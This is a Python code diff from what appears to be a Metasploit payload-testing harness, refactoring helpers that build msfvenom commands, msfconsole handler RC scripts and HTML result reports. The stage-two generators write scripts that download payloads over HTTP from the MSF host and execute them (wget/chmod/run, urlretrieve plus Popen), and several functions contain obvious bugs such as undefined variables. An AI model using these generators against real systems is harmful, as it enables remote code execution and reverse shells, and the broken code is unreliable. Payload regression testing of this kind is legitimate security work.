@@ -7,14 +7,15 @@ from __builtin__ import False
 #
 # GOT TIRED OF TRACKING THIS DATA IN A LIST
 # 
-class payloadData:
-    def __init__(self, targetVmIp, payloadName, payloadType, venomCmd, rcScriptName, rcScriptContent):
-        self.targetVmIp =      targetVmIp
-        self.payloadName =     payloadName
-        self.payloadType =     payloadType
-        self.venomCmd =        venomCmd
-        self.rcScriptName =    rcScriptName
-        self.rcScriptContent = rcScriptContent
+class OLDpayloadData:
+    def __init__(self, msfHost, targetVmIp, payloadName, payloadType, venomCmd, rcScriptName, rcScriptContent):
+        self.msfHost =          msfHost         # THE msfHost HANDLING THE PAYLOAD
+        self.targetIp =         targetVmIp      #THE IP ADDRESS OF THE TARGET
+        self.payloadName =      payloadName     
+        self.payloadType =      payloadType
+        self.venomCmd =         venomCmd
+        self.rcScriptName =     rcScriptName
+        self.rcScriptContent =  rcScriptContent
 
 class portValue:
     """
@@ -49,7 +50,41 @@ def loadJson(fileName):
         logMsg("FAILED TO PARSE JSON FILE " + fileName + "\n" + str(f))
     return retDict
 
-def makeBindLaunchScript(devVmIp, msfPath, testVms, httpPort, scriptName):
+def makeHtmlReport(targetData, msfHosts):
+    htmlString = "<html>\n<head>\n<title>\n\tTEST RESULTS\n</title>\n</head>\n\n<body>\n"
+    htmlString = htmlString + "<table border=\"1\">\n<tr><td>MSF_HOST NAME</td><td>MSF_HOST IP</td><td>MSF COMMIT VERSION</td></tr>\n"
+    for msfHost in msfHosts:
+        htmlString = htmlString + "<tr><td>" + msfHost['NAME'] + "</td><td>" + msfHost['IP_ADDRESS'] + "</td><td>" + msfHost['COMMIT_VERSION'] + "</td></tr>\n"
+    htmlString = htmlString + "</table>\n"
+    htmlString = htmlString + "<table border=\"1\">\n<tr><td>TARGET</td><td>TYPE</td><td>MSF_HOST</td><td>EXPLOIT</td><td>PAYLOAD</td><td>STATUS</td><td>SESSION</td></tr>\n"
+    passedString = "<td bgcolor = \"#00cc00\">PASSED</td>"
+    failedString = "<td bgcolor = \"#cc0000\">FAILED</td>"
+    for host in targetData:
+        stageTwoFileName = "NONE?"
+        if 'STAGE_TWO_FILENAME' in host:
+            stageTwoFileName = host['STAGE_TWO_FILENAME']
+        for sessionData in host['SESSION_DATASETS']:
+            payloadFileName = "NONE?"
+            if 'FILENAME' in sessionData['PAYLOAD']:
+                payloadFileName = sessionData['PAYLOAD']['FILENAME']
+            htmlString = htmlString + "<tr><td>" + host['NAME'] + "<br>" + host['IP_ADDRESS'] + "</td>" + \
+                                    "<td>" + host['TYPE'] + "</td>" + \
+                                    "<td>" + sessionData['MSF_HOST']['NAME'] + "<br>" + sessionData['MSF_HOST']['IP_ADDRESS'] + "</td>" + \
+                                    "<td>" + sessionData['EXPLOIT']['NAME'] + "</td>" + \
+                                    "<td>" + sessionData['PAYLOAD']['NAME'] + "<br>" + payloadFileName + "</td>"
+            if 'STATUS' in sessionData:
+                if sessionData['STATUS']:
+                    htmlString = htmlString + "<td bgcolor = \"#00cc00\">PASSED</td>\n"
+                else:
+                    htmlString = htmlString + "<td bgcolor = \"#cc0000\">FAILED</td>\n"
+            else:
+                htmlString = htmlString + "<td> NO STATUS LISTED?</td>\n"
+            htmlString = htmlString + "<td><a href=" + sessionData['LOCAL_SESSION_FILE'] + ">SESSION CONTENT</a></td></tr>\n"
+
+    htmlString = htmlString + "</table>\n</body>\n</html>\n"
+    return htmlString
+
+def OLDmakeBindLaunchScript(devVmIp, msfPath, testVms, httpPort, scriptName):
     """
     makeBindLaunchScript CREATES A BASH SCRIPT TO LAUNCH THE BIND CALL-INS
     WITH THE CREATED RC SCRIPTS
@@ -68,9 +103,9 @@ def makeBindLaunchScript(devVmIp, msfPath, testVms, httpPort, scriptName):
     bindScript.close()
 
     
-def makeDevPayloadScript(devVmIp, msfPath, testVms, httpPort, scriptName, commitFileName):
+def OLDmakeAndHostPayloads(configfData):
     """
-     makeDevPayloadScript CREATES A BASH SCRIPT TO:
+     makeAndHostPayloads CREATES A BASH SCRIPT TO:
      -CREATE A TEMPORARY PAYLOAD DIRECTORY
      -CREATE THE REQUIRED MSFPAYLOADS FROM THE COMMANDS IN THE PAYLOADS LIST
      -MOVE THE PAYLOADS INTO THE TEMP DIRECTORY
@@ -122,6 +157,128 @@ def makeDevPayloadScript(devVmIp, msfPath, testVms, httpPort, scriptName, commit
     venomScript.close()
     logMsg("PAYLOAD CREATION/REVERSE HANDLER SCRIPT SAVED AS: " + scriptName)
 
+def makeVenomCmd(targetData, sessionData, portTracker, logFile):
+    payloadData = sessionData['PAYLOAD']
+    payloadType = payloadData['NAME']
+    payloadFileName = payloadData['FILENAME']
+    msfHostData = sessionData['MSF_HOST']
+    """
+    WHAT FILE EXTENSION SHOULD WE USE?
+    """
+    execFormat = ''
+    if 'windows' in payloadData['NAME'].lower():
+        payloadFileName = payloadFileName + ".exe"
+        execFormat = ' -f exe '
+    elif 'mettle' in payloadData['NAME'].lower():
+        payloadFileName = payloadFileName + ".elf"
+        execFormat = ' -f elf '
+    elif 'python' in payloadData['NAME'].lower():
+        payloadFileName = payloadFileName + ".py"
+    elif 'java' in payloadData['NAME'].lower():
+        payloadFileName = payloadFileName + ".jar"
+    else:
+        logMsg(logFile, "UNKNOWN PAYLOAD TYPE: " + payloadData['NAME'].lower())
+    payloadData['FILENAME'] = payloadFileName
+    logMsg(logFile, "PAYLOAD FILENAME = " + payloadData['FILENAME'])
+    msfVenomCmd = "./msfvenom -p " + payloadData['NAME'] + execFormat + " -o " + payloadData['FILENAME']
+    # ADD HOST DATA
+    if 'bind' in payloadType.lower():
+        msfVenomCmd = msfVenomCmd + " RHOST=" + targetData['IP_ADDRESS'] + " RPORT=" + str(payloadData['PRIMARY_PORT'])
+    else:
+        msfVenomCmd = msfVenomCmd + " LHOST=" + msfHostData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
+    for settingEntry in payloadData['SETTINGS']:
+        msfVenomCmd = msfVenomCmd + " " + settingEntry
+    logMsg(logFile, "msfvenom cmd = " + msfVenomCmd)
+    return msfVenomCmd
+
+def OLDmakeUploadMsfHostRcScript(cmdList, msfHostData, targetData, payloadData, logFile):
+    exploitPayloadPair = {}
+    exploitData = {}
+    exploitData['NAME'] = 'exploit/multi/handler'
+    exploitData['SETTINGS'] = []
+    exploitPayloadPair['EXPLOIT_MODULE'] = exploitData
+    exploitPayloadPair['PAYLOAD'] = payloadData
+    return makeExploitMsfHostRcScript(cmdList, msfHostData, targetData, sessionData, logFile)
+
+def makeRcScript(cmdList, targetData, sessionData, logFile):
+    rcScriptContent =   "# HANDLER SCRIPT FOR \n" + \
+                    "# EXPLOIT:  " + sessionData['EXPLOIT']['NAME'] + "\n" + \
+                    "# PAYLOAD:  " + sessionData['PAYLOAD']['NAME'] + "\n" + \
+                    "# TARGET:   " + targetData['NAME'] + ' [' + targetData['IP_ADDRESS'] +"]\n" + \
+                    "# MSF HOST: " + sessionData['MSF_HOST']['IP_ADDRESS'] + "\n"
+    rcScriptName = sessionData['RC_IN_SCRIPT_NAME']
+    rubySleep = "echo '<ruby>' >> " + rcScriptName + '\n'
+    rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
+    rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo 'use " + sessionData['EXPLOIT']['NAME'] + " ' > " + rcScriptName + "\n"
+    if sessionData['EXPLOIT']['NAME'] != 'exploit/multi/handler':
+        rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + " ' >> " + rcScriptName + "\n"
+    for settingItem in sessionData['EXPLOIT']['SETTINGS']:
+        rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo 'set payload " + sessionData['PAYLOAD']['NAME'] +"' >> " + rcScriptName + '\n'
+    for settingItem in sessionData['PAYLOAD']['SETTINGS']:
+        rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
+    if 'bind' in sessionData['PAYLOAD']['NAME']:
+        rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
+        rcScriptContent = rcScriptContent + "echo 'set RPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
+    if 'reverse' in sessionData['PAYLOAD']['NAME']:
+        rcScriptContent = rcScriptContent + "echo 'set LHOST " + sessionData['MSF_HOST']['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
+        rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
+    for settingEntry in sessionData['PAYLOAD']['SETTINGS']:
+        if '=' in settingEntry:
+            strSetting = "SET " + settingEntry.split('=')[0] + " " + settingEntry.split('=')[1]
+    rcScriptContent = rcScriptContent + rubySleep
+    rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '    while framework.sessions.count == 0 do '>> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '        sleep(1)' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '    end' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '    sleep(2)' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
+    for i in cmdList:
+        rcScriptContent = rcScriptContent + rubySleep
+        rcScriptContent = rcScriptContent + "echo '" + i + "' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo 'exit -y' >> " + rcScriptName + '\n'
+    return rcScriptContent
+
+def OLDmakeExploitMsfHostRcScript(cmdList, msfHostData, targetData, payloadData, logFile):
+    rcScriptName = payloadData['RC_SCRIPT_NAME']
+    rubySleep = "echo '<ruby>' >> " + rcScriptName + '\n'
+    rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
+    rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'
+    rcScriptContent = "# HANDLER SCRIPT FOR " + payloadData['VENOM_CMD'] +" \n"
+    rcScriptContent = rcScriptContent + "echo 'use exploit/multi/handler ' > " + rcScriptName + "\n"
+    rcScriptContent = rcScriptContent + rubySleep
+    rcScriptContent = rcScriptContent + "echo 'set payload " + payloadData['NAME'] +"' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + rubySleep
+    if 'bind' in payloadData['NAME']:
+        rcScriptContent = rcScriptContent + "echo 'set RHOST " + msfHostData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
+        if 'UPLOAD' in msfHostData['METHOD']:
+            rcScriptContent = rcScriptContent + "echo 'set RPORT " + str(payloadData['PORT']) + "' >> " + rcScriptName + '\n'
+    if 'reverse' in payloadData['NAME']:
+        rcScriptContent = rcScriptContent + "echo 'set LHOST " + msfHostData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
+        if 'UPLOAD' in msfHostData['METHOD']:
+            rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(payloadData['PORT']) + "' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + rubySleep
+    for settingEntry in payloadData['SETTINGS']:
+        if '=' in settingEntry:
+            strSetting = "SET " + settingEntry.split('=')[0] + " " + settingEntry.split('=')[1]
+    rcScriptContent = rcScriptContent + rubySleep
+    rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '    while framework.sessions.count == 0 do '>> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '        sleep(1)' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '    end' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '    sleep(2)' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
+    for i in cmdList:
+        rcScriptContent = rcScriptContent + rubySleep
+        rcScriptContent = rcScriptContent + "echo '" + i + "' >> " + rcScriptName + '\n'
+    rcScriptContent = rcScriptContent + "echo 'exit -y' >> " + rcScriptName + '\n'
+    return rcScriptContent
+
+    
+
 """
 makeMetCmd()
 CREATES A TUPLE MADE UP OF
@@ -131,7 +288,7 @@ CREATES A TUPLE MADE UP OF
 - THE TEXT FOR A CUSTOM RC SCRIPT TO SET UP THE CONNECTION AND TEST THE PAYLOAD
 """
 
-def makeMetCmd(payloadType, msfIp, targetVmIp, metPort, cmdList):
+def OLDmakeMetCmd(payloadType, msfIp, targetVmIp, metPort, cmdList):
     """
     makeMetCmd CREATES THE REQUIRED msfvenom COMMANDS AND RC SCRIPT
     FILES FOR THE PAYLOADS AND OSs LISTED
@@ -210,35 +367,28 @@ def makeMetCmd(payloadType, msfIp, targetVmIp, metPort, cmdList):
     rcScriptContent = rcScriptContent + "echo 'exit -y' >> " + rcScriptName + '\n'
     return payloadData(targetVmIp, payloadName, payloadType, venomCmd, rcScriptName, rcScriptContent)
 
-def makeShTestVmScript(devVmIp, msfPath, testVm, scriptName, testDict):
-    remotePath =    testDict['NIX_PAYLOAD_DIRECTORY']
-    httpPort =      testDict['HTTP_PORT']
-    shTestScript = "# AUTOGENERATED TEST SCRIPT \n"
-    shTestScript = shTestScript + "cd " + remotePath + " \n"
-    for payloadData in testVm.payloadList:
-        url = "'http://" + devVmIp + ":" + str(httpPort) + "/" + payloadData.payloadName + "'"
-        shTestScript = shTestScript + "\nwget " + url + "\n"
-        shTestScript = shTestScript + "sleep 5 \n"
-        shTestScript = shTestScript + "chmod 755 " + payloadData.payloadName + "\n"
-        if '.py' in payloadData.payloadName:
-            shTestScript = shTestScript + "python " + payloadData.payloadName + "&\n"
-        elif '.jar' in payloadData.payloadName:
-            shTestScript = shTestScript + "java -jar " + payloadData.payloadName + "&\n"
-        elif '.elf' in payloadData.payloadName:
-            shTestScript = shTestScript + "./" + payloadData.payloadName + "&\n"
-    shScript = open(scriptName, 'wb')
-    shScript.write(shTestScript)
-    shScript.close()
+def makeStageTwoShScript(targetData, payloadPort):
+    stageTwoShContent = "# AUTOGENERATED TEST SCRIPT \n"
+    stageTwoShContent = shTestScript + "cd " + targetData['PAYLOAD_PATH'] + " \n"
+    for payloadData in targetData['PAYLOADS']:
+        url = "'http://" + payloadData['MSF_HOST_IP'] + ":" + str(payloadPort) + "/" + payloadData['PAYLOAD_FILENAME'] + "'"
+        stageTwoShContent = stageTwoShContent + "\nwget " + url + "\n"
+        stageTwoShContent = stageTwoShContent + "sleep 5 \n"
+        stageTwoShContent = stageTwoShContent + "chmod 755 " + payloadData['NAME'] + "\n"
+        if '.py' in payloadData['NAME']:
+            stageTwoShContent = stageTwoShContent + "python " + payloadData.payloadName + "&\n"
+        elif '.jar' in payloadData['NAME']:
+            stageTwoShContent = stageTwoShContent + "java -jar " + payloadData.payloadName + "&\n"
+        elif '.elf' in payloadData['NAME']:
+            stageTwoShContent = stageTwoShContent + "./" + payloadData.payloadName + "&\n"
+    return stageTwoShContent
 
-def makePyTestVmScript(devVmIp, msfPath, testVm, scriptName, testDict):
-    remotePath = testDict['WIN_PAYLOAD_DIRECTORY']
-    httpPort = testDict['HTTP_PORT']
-
-    pyTestScript = "# AUTOGENERATED TEST SCRIPT \n"
-    pyTestScript = pyTestScript + "import subprocess\n"
-    pyTestScript = pyTestScript + "import time\n"
-    pyTestScript = pyTestScript + "import tempfile\n"
-    pyTestScript = pyTestScript + "import urllib\n\n"
+def makeStageTwoPyScript(targetData, httpPort):
+    stageTwoPyContent = "# AUTOGENERATED TEST SCRIPT \n"
+    stageTwoPyContent = stageTwoPyContent + "import subprocess\n"
+    stageTwoPyContent = stageTwoPyContent + "import time\n"
+    stageTwoPyContent = stageTwoPyContent + "import tempfile\n"
+    stageTwoPyContent = stageTwoPyContent + "import urllib\n\n"
     
     """
     functionally, we need to create the following code for each payload:
@@ -248,31 +398,30 @@ def makePyTestVmScript(devVmIp, msfPath, testVm, scriptName, testDict):
       urllib.urlretrieve(url, filename)
     execute it
     """
-    for i in testVm.payloadList:
-        pyTestScript = pyTestScript + "url = 'http://" + devVmIp + ":" + str(httpPort) + "/" + i.payloadName + "'\n"
-        pyTestScript = pyTestScript + "fileName = r'" + remotePath + "/" + i.payloadName + "'\n"
-        if '.py' in i.payloadName:
-            pyTestScript = pyTestScript + "cmdList = [r'" + testDict['TEST_PYTHON_EXE'] +"', fileName]\n"
-        elif 'jar' in i.payloadName:
-            pyTestScript = pyTestScript + "cmdList = [r'" + testDict['TEST_JAVA_EXE'] + "','-jar', fileName]\n"
+    for sessionData in targetData['SESSION_DATASETS']:
+        msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
+        payloadFile = sessionData['PAYLOAD']['FILENAME']
+        stageTwoPyContent = stageTwoPyContent + "url = 'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
+        stageTwoPyContent = stageTwoPyContent + "fileName = r'" + targetData['PAYLOAD_DIRECTORY'] + '\\' + payloadFile + "'\n"
+        if '.py' in payloadFile:
+            stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['PYTHON_PATH'] +"', fileName]\n"
+        elif 'jar' in payloadFile:
+            stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['JAVA_PATH'] + "','-jar', fileName]\n"
         else:
-            pyTestScript = pyTestScript + "cmdList = [fileName]\n"
-        pyTestScript = pyTestScript + "try:\n"
-        pyTestScript = pyTestScript + "  urllib.urlretrieve(url, fileName)\n"
-        pyTestScript = pyTestScript + "  subprocess.Popen(cmdList)\n"
-        pyTestScript = pyTestScript + "except IOError as ioexep:\n"
-        pyTestScript = pyTestScript + "  print 'Error when launching ' + str(cmdList), ioexep\n"
-        pyTestScript = pyTestScript + "except WindowsError as winerr:\n"
-        pyTestScript = pyTestScript + "  print 'Error when launching ' + str(cmdList), winerr\n"
-        pyTestScript = pyTestScript + "except:\n"
-        pyTestScript = pyTestScript + "  print 'God only knows what happened'\n"
-        pyTestScript = pyTestScript + "time.sleep(5)\n"
-    pyScript = open(scriptName, 'wb')
-    pyScript.write(pyTestScript)
-    pyScript.close()
+            stageTwoPyContent = stageTwoPyContent + "cmdList = [fileName]\n"
+        stageTwoPyContent = stageTwoPyContent + "try:\n"
+        stageTwoPyContent = stageTwoPyContent + "  urllib.urlretrieve(url, fileName)\n"
+        stageTwoPyContent = stageTwoPyContent + "  subprocess.Popen(cmdList)\n"
+        stageTwoPyContent = stageTwoPyContent + "except IOError as ioexep:\n"
+        stageTwoPyContent = stageTwoPyContent + "  print 'Error when launching ' + str(cmdList), ioexep\n"
+        stageTwoPyContent = stageTwoPyContent + "except WindowsError as winerr:\n"
+        stageTwoPyContent = stageTwoPyContent + "  print 'Error when launching ' + str(cmdList), winerr\n"
+        stageTwoPyContent = stageTwoPyContent + "except:\n"
+        stageTwoPyContent = stageTwoPyContent + "  print 'God only knows what happened'\n"
+        stageTwoPyContent = stageTwoPyContent + "time.sleep(5)\n"
+    return stageTwoPyContent
 
-
-def generateReport(fileList, testVmList, reportFileName, sessionDir, commitVersion):
+def OLDgenerateReport(fileList, testVmList, reportFileName, sessionDir, commitVersion):
     reportFile = open(reportFileName, 'wb')
     for i in testVmList:
         for j in i.payloadList:
@@ -307,7 +456,7 @@ def generateReport(fileList, testVmList, reportFileName, sessionDir, commitVersi
     reportFile.close()
     return reportFileName
 
-def populateResults(fileList, testVmList, dataDict):
+def OLDpopulateResults(fileList, testVmList, dataDict):
     payloadResults = {}
     successList = dataDict['SUCCESS_LIST']
     sessionDir = dataDict['SESSION_DIR']
@@ -339,7 +488,7 @@ def populateResults(fileList, testVmList, dataDict):
             logMsg(str(i.resultDict))
     return payloadResults
 
-def printResults(testVmList):
+def OLDprintResults(testVmList):
     for i in testVmList:
         for j in i.payloadList:
             if i.resultDict[j.payloadType]:
@@ -347,7 +496,7 @@ def printResults(testVmList):
             else:
                 logMsg('[FAILED]' + i.vmName + ':' + str(j.payloadType))
 
-def generateHtmlReport(resultsDic, fileName, testVms, commitVersion, dataDict):
+def OLDgenerateHtmlReport(resultsDic, fileName, testVms, commitVersion, dataDict):
     payloadTypes =  dataDict['PAYLOAD_LIST']
     testName =      dataDict['TEST_NAME']
     
@@ -385,7 +534,7 @@ def generateHtmlReport(resultsDic, fileName, testVms, commitVersion, dataDict):
         return False
     return True
 
-def makeWebResults(testVmList, fileName):
+def OLDmakeWebResults(testVmList, fileName):
     try:
         fileObj = open(fileName, 'wb')
     except IOError:
@@ -419,18 +568,20 @@ def getListFromFile(fileName):
     logMsg(str(retList))
     return retList
 
-def logMsg(strMsg, logFile = 'stdout', newline = True):
+def logMsg(logFile, strMsg):
     if strMsg == None:
         strMsg="[None]"
-    if newline:
-        strMsg = strMsg + '\n'
-    dateStamp = '[' + str(datetime.now())+ '] '
-    if logFile.lower() == 'stdout':
-        print dateStamp + strMsg,
-    else:
-        logFileObj = open(logFile, 'wb')
-        logFileObj.write(dateStamp + strMsg)
+    dateStamp = 'testlog:[' + str(datetime.now())+ '] '
+    #DELETE THIS LATER:
+    print dateStamp + str(strMsg)
+    try:
+        logFileObj = open(logFile, 'ab')
+        logFileObj.write(dateStamp + strMsg +'\n')
         logFileObj.close()
+    except IOError:
+        return False
+    return True
+  
     
 def selectVms(vmList, posFilter=None):
     menuVms = []
